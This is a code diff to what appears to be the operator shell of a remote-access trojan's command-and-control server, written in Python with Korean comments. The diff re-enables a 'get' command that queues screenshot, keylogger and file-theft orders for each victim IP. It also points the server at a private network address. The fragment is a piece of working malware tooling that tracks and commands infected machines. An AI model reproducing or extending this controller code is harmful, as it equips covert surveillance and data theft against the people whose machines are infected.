@@ -77,6 +77,7 @@ class EntryShell(BaseShell):
             try:
                 victim_shell.cmdloop()
             except KeyboardInterrupt:
+                print()
                 return
 
     def do_show(self, arg):
@@ -114,16 +115,15 @@ class VictimShell(BaseShell):
         pass
 
     # screenshot, gf, keylogger를 get으로 통합하는 테스트 코드
-    """
+    
     def do_get(self, arg):
         '''get (screenshot|keylog|file)'''
         global victim_table
 
-        parsed_arg = self._arg_parse(arg)
+        parsed_arg, arg_len = self._arg_parse(arg)
 
         if parsed_arg[0] == 'screenshot':
             victim_table[self.targetIP]['command'].append('[screenshot]')
-            pass
         elif parsed_arg[0] == 'keylog':
             victim_table[self.targetIP]['command'].append('[keylog]')
         elif parsed_arg[0] == 'file':
@@ -145,7 +145,7 @@ class VictimShell(BaseShell):
                 pass
 
             victim_table[self.targetIP]['command'].append('[gf {}]'.format(arg))
-    """
+    
 
     def do_gf(self, arg):
         '''get victim's file\nusage : gf [file path & name] or gf [victim file path & name] [save name]'''
@@ -502,7 +502,7 @@ FILE_PATH = './file/'
 TMP_FILE_PATH = SEQManager.TMP_FILE_PATH
 
 ENCODING = 'cp949'
-SERVER_INFO = ('127.0.0.1', 80)
+SERVER_INFO = ('172.17.242.56', 80)
 
 victim_table = {} # {ip : {index : [index num], command : [command queue], shCommand : [sh queue], seqName : [seqName queue]}}
 victim_index = 0
